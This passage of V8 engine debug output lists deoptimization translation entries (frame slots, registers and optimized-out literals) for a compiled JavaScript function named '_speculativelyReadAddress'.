                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    35              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    36              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    37              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    38              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    39              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_STACK_SLOT {input=21}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    40              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_REGISTER {input=r12}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    41              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_REGISTER {input=r12}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    42              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_REGISTER {input=r12}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    43              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_REGISTER {input=r12}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    44              129    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=129, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=20 (bool)}
                               INT32_REGISTER {input=r12}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rdx}
    45              215    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=215, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               REGISTER {input=rax}
                               INT32_STACK_SLOT {input=22}
                               REGISTER {input=rdi}
                               REGISTER {input=rdx}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
    46               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    47               60   708  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=60, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
    48               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    49               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    50               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=11}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    51               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    52               60   8cb  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=60, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
    53               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    54               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    55               52    NA  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=52, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=22}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
    56              160   a45  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=160, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               INT32_STACK_SLOT {input=17}
                               BOOL_STACK_SLOT {input=18 (bool)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=21}
    57              147   a9e  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=147, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=17 (bool)}
                               INT32_STACK_SLOT {input=18}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=21}
    58              127   c11  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=127, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=17 (bool)}
                               INT32_STACK_SLOT {input=18}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=20}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=21}
    59              109   c63  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=109, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=17 (bool)}
                               INT32_STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               INT32_STACK_SLOT {input=20}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=21}
    60              100   caa  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=100, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=17 (bool)}
                               INT32_STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=4 (0x1881164127e9 <JSFunction Uint8Array (sfi = 0x2e97c214b01)>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=20}
    61               80   ce7  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=80, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               BOOL_STACK_SLOT {input=17 (bool)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
    62               50   d21  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=50, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=18}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=19}
    63               44   d54  BEGIN {frame count=1, js frame count=1, update_feedback_count=0}
                               INTERPRETED_FRAME {bytecode_offset=44, function=0x139723ed8199 <String[25]: _speculativelyReadAddress>, height=11}
                               STACK_SLOT {input=3}
                               STACK_SLOT {input=-1}
                               STACK_SLOT {input=16}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               STACK_SLOT {input=17}
                               STACK_SLOT {input=12}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
                               LITERAL {literal_id=2 (0x16ddeb702f39 <Odd Oddball: optimized_out>)}
